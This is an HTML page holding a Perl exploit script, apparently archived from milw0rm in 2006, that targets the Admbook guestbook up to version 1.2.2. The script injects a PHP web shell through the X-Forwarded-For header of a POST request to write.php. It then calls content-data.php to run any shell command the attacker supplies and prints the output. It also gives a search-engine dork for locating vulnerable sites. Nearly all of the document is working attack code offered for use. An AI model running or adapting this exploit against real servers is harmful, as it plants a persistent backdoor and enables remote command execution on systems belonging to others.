<html>
<head>
<title>Admbook <= 1.2.2 (X-Forwarded-For) Remote Command Execution Exploit</title>
<pre>
#!/usr/bin/perl -w
use IO::Socket;

print &quot;*************************************************************************\r\n&quot;;
print &quot;|            Admbook &lt;=1.2.2 X-Forwarded-For cmmnds xctn xploit        |\r\n&quot;;
print &quot;|                     By rgod rgod&lt;AT&gt;autistici&lt;DOT&gt;org                |\r\n&quot;;
print &quot;|                   site: http://retrogod.altervista.org               |\r\n&quot;;
print &quot;|                                                                      |\r\n&quot;;
print &quot;| Sun-Tzu: \&quot;Rouse him, and learn the principle of his  activity  or    |\r\n&quot;;
print &quot;| inactivity.  Force him to reveal himself,  so as to find out  his    |\r\n&quot;;
print &quot;| vulnerable spots.\&quot;                                                   |\r\n&quot;;
print &quot;*************************************************************************\r\n&quot;;
print &quot;| dork:  intitle:admbook intitle:version filetype:php                   |\r\n&quot;;
print &quot;*************************************************************************\r\n&quot;;
sub main::urlEncode {
    my ($string) = @_;
    $string =~ s/(\W)/&quot;%&quot; . unpack(&quot;H2&quot;, $1)/ge;
    #$string# =~ tr/.//;
    return $string;
 }

$serv=$ARGV[0];
$path=$ARGV[1];
$cmd=&quot;&quot;; for ($i=2; $i&lt;=$#ARGV; $i++) {$cmd.=&quot;%20&quot;.urlEncode($ARGV[$i]);};

if (@ARGV &lt; 3)
{
print &quot;Usage:\r\n&quot;;
print &quot;perl admbook_122_xpl.pl SERVER PATH COMMAND\r\n\r\n&quot;;
print &quot;SERVER         - Server where AdmBook is installed.\r\n&quot;;
print &quot;PATH           - Path to AdmBook (ex: /admbook/ or just /) \r\n&quot;;
print &quot;COMMAND        - A shell command \r\n&quot;;
print &quot;Example:\r\n&quot;;
print &quot;perl admbook_122_xpl.pl localhost /admbook/ ls -la\r\n&quot;;
exit();
}

$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, Timeout  =&gt; 10, PeerPort=&gt;&quot;http(80)&quot;)
or die &quot;[+] Connecting ... Could not connect to host.\n\n&quot;;
               
$SHELL='&quot;;if (isset($_GET[CMD])){ECHO&quot;Hi Master!&quot;;INI_SET(&quot;max_execution_time&quot;,0);PASSTHRU($_GET[CMD]);DIE;}echo&quot;';
$data=&quot;page=1&quot;;
$data.=&quot;&amp;name=whoami&quot;;
$data.=&quot;&amp;url=&quot;;
$data.=&quot;&amp;email=whoami\@SUNTZU.COM&quot;;
$data.=&quot;&amp;icq=&quot;;
$message=urlEncode(&quot;I love italian guys!&quot;);
$data.=&quot;&amp;message=&quot;.$message;
print $sock &quot;POST &quot;.$path.&quot;write.php HTTP/1.1\r\n&quot;;
print $sock &quot;Referer: http://&quot;.$serv.$path.&quot;index.php\r\n&quot;;
print $sock &quot;X-Forwarded-For: GUESS_WHAT:&quot;.$SHELL.&quot;\r\n&quot;;
print $sock &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
print $sock &quot;User-Agent: sun-tzu\r\n&quot;;
print $sock &quot;Content-Length: &quot;.length($data).&quot;\r\n&quot;;
print $sock &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
print $sock &quot;Connection: Close\r\n\r\n&quot;;
print $sock $data;
close($sock);

sleep(2);

$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, Timeout  =&gt; 10, PeerPort=&gt;&quot;http(80)&quot;)
or die &quot;[+] Connecting ... Could not connect to host.\n\n&quot;;

print $sock &quot;GET &quot;.$path.&quot;content-data.php?CMD=&quot;.$cmd.&quot; HTTP/1.1\r\n&quot;;
print $sock &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
print $sock &quot;Connection: close\r\n\r\n&quot;;

while ($answer = &lt;$sock&gt;) {
  print $answer;
}
close($sock);

# milw0rm.com [2006-02-19]
</pre>
</html>

